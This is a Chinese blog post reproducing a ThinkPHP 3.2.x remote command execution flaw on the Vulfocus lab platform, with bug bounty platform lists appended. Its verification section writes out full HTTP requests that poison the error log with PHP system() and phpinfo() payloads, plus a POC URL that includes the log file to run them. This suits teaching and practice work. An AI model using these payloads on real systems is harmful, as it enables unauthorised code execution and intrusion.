# 原创
：  【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x

# 【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）写入错误日志中（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|命令、代码执行博文|目标|状态
|[【漏洞复现-jupyter_notebook-命令执行】vulfocus/jupyter_notebook-cve_2019_9644](https://blog.csdn.net/qq_53079406/article/details/127491074)|发现功能点上的命令执行|已发布
|[【漏洞复现-solr-命令执行】vulfocus/solr-cve_2019_17558](https://blog.csdn.net/qq_53079406/article/details/127332723)|寻找模板（接口、配置文件）的命令执行漏洞|已发布
|[【漏洞复现-seaCms-命令执行】vulfocus/seacms-cnvd_2020_22721](https://blog.csdn.net/qq_53079406/article/details/127329791)|写入可执行文件|已发布
|[【漏洞复现-maccms-命令执行】vulfocus/maccms-cve_2017_17733](https://blog.csdn.net/qq_53079406/article/details/127328882)|参数中写入命令（加密）|已发布
|[【漏洞复现-webmin-命令执行】vulfocus/webmin-cve_2019_15107](https://blog.csdn.net/qq_53079406/article/details/127326071)|拼接执行命令|已发布
|[【漏洞复现-thinkphp-命令执行】vulfocus/thinkphp-3.2.x](https://blog.csdn.net/qq_53079406/article/details/127324775)|写入错误日志中|已发布
|[【漏洞复现-Discuz-代码执行】Discuz_CVE-2019-13956](https://blog.csdn.net/qq_53079406/article/details/127305443)|cookie中植入|已发布
|[【漏洞复现-骑士cms-代码执行】vulfocus/骑士cms_cve_2020_35339](https://blog.csdn.net/qq_53079406/article/details/127301708)|后台配置中植入命令|已发布
|更多复现漏洞将公布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)

123.58.224.8:62651
123.58.224.8:53137

123.58.224.8:53137
（是个空白页面）




> 
<h3>1.2、知识:</h3>
1、Log记录目录（日期格式）
开启debug模式日志保存在：\Application\Runtime\Logs\Home\
未开启debug模式日志保存在：\Application\Runtime\Logs\Common\
2、路径
上传恶意代码到服务器上，需包含其文件相对或绝对路径
/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./[filename]
3、PHP代码写法
&lt;?=phpinfo();?&gt;
&lt;?=system(ls /tmp);?&gt;
4、日志记录
如果状态码200，就不会记录在日志中，要错误状态码（如404）
可能错误的记录地方有多个，如请求头中的UA、请求地址等


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
抓包

 报错，可以尝试写入日志里面


<hr/>
方法一：
（我测试失败了）
写入命令ls /tmp
GET /index.php?m=--&gt;&lt;?=system(ls%20/tmp);?&gt; HTTP/1.1

<pre><code>GET /index.php?m=--&gt;&lt;?=system(ls%20/tmp);?&gt; HTTP/1.1
Host: 123.58.224.8:45730
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=r39k0c745brbo2328lkvk8llnv;
Connection: close
Upgrade-Insecure-Requests: 1</code></pre>

 报错了,就写入日志了<img alt="" height="902" src="https://img-blog.csdnimg.cn/f909a70240c14457af9e8a85a4798031.png" width="1200"/>
访问日志（22_10_14年月日）
http://ip:port/Application/Runtime/Logs/Common/22_10_14.log

POC:
http://ip:port/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/22_10_14.log

<hr/>
方法二：
直接写入phpinfo
（和上面基本上一样）
GET /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/1.1


<pre><code>GET /index.php?m=--&gt;&lt;?=phpinfo();?&gt; HTTP/1.1
Host: 123.58.224.8:45730
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=r39k0c745brbo2328lkvk8llnv;
Connection: close
Upgrade-Insecure-Requests: 1

</code></pre>

访问日志
http://ip:port/Application/Runtime/Logs/Common/22_10_14.log

/index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Common/22_10_14.log




---


> 
<h3>2.4、解题：</h3>




---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="23"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

